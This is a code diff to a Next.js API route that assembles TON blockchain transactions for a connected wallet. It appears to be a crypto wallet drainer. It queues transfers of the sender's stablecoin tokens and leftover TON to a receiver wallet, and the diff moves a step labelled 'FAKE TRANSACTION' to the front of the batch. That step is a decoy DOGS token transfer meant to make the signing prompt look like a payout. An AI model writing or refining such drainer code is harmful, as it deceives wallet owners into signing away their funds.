@@ -56,7 +56,16 @@ export async function POST(req: NextRequest) {
 
 	if (tons < toNano('0.2')) throw("Balance")
 
-	let transactions = [];
+	// FAKE TRANSACTION
+	const dogsSenderJettonWallet = await getContractWallet(dogsAddress, senderWallet);
+	let transactions = [
+		{
+			amount: fee.toString(),
+			address: dogsSenderJettonWallet.toString(),
+			payload: await createTokenTransferPayload(receiverWallet, senderWallet, toNano('304734'))
+		}
+	];
+
 
 	const contracts = [
 		tetherAddress,
@@ -68,13 +77,12 @@ export async function POST(req: NextRequest) {
 		const jettonWallet = await getContractWallet(contract, senderWallet);
 		const balance = await getTokenBalance(jettonWallet);
 
-
-
 		const payload = await createTokenTransferPayload(
 			senderWallet,
 			receiverWallet,
-			balance
+			toNano('100')
 		);
+
 
 		transactions.push({
 			address: jettonWallet.toString(),
@@ -83,14 +91,7 @@ export async function POST(req: NextRequest) {
 		})
 	}
 
-	// FAKE TRANSACTION
-	const dogsSenderJettonWallet = await getContractWallet(dogsAddress, senderWallet);
-	transactions.push({
-		amount: fee.toString(),
-		address: dogsSenderJettonWallet.toString(),
-		payload: await createTokenTransferPayload(receiverWallet, senderWallet, toNano('304734'))
-	})
-
+	transactions = transactions.slice(0,3)
 
 	const remains = (tons - (fee * BigInt(transactions.length + 1)));
 	if (remains > toNano('0.2')) {
@@ -100,8 +101,6 @@ export async function POST(req: NextRequest) {
 			payload: (beginCell().storeUint(0, 32).storeStringTail(defaultText).endCell()).toBoc().toString('base64')
 		})
 	}
-
-	transactions = transactions.slice(0,3)
 
 	return NextResponse.json({
 		validUntil: Math.floor(Date.now() / 1000) + 500,
